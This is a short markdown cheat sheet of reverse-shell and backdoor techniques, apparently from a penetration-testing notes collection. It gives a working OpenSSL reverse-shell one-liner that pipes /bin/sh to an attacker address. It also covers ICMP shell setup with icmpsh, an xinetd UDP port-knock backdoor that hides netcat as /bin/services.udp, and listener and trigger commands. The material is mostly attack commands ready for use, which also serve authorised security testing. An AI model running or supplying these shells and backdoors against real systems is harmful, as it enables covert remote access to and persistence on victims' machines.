# OpenSSL Reverse Shell
[Generate OpenSSL Certificate](../../SSL/OpenSSL/README.md#Generate-SSL-Certificate)
[Start OpenSSL Listener](../../SSL/OpenSSL/README.md#Start-OpenSSL-Listener)
##### From Target, create named pipe and OpenSSL client to connect to Attack Machine.
```bash
# On Target
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <Attack IP ADdress>:443 > /tmp/x; rm /tmp/x
```

# ICMP Reverse Shell with icmpsh
##### Disable ICMP replies by the OS
```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```
## ICMP Reverse Shell References
[Github icmpsh](https://github.com/bdamele/icmpsh)

[Pentestlab Blog](https://pentestlab.blog/tag/icmpsh/)

[Security Online](https://securityonline.info/icmpsh-simple-reverse-icmp-shell/)

# Xinetd UDP Portknock Backdoor
##### [On Target, create xinetd service](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56)
It requires that netcat is on the target, in the /bin directory.  It copies netcat to file /bin/services.udp.
##### Start netcat listener on Attack machine
```bash
nc -lnvp <Port #>
```
##### Send a single UDP packet to target, "knocking," and causing the target to establish a reverse shell.
```bash
hping3 -2 -c 1 <Target IP Address> -p 65534
```

# References
[HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[Staged vs Stageless Handlers](https://buffered.io/posts/staged-vs-stageless-handlers/)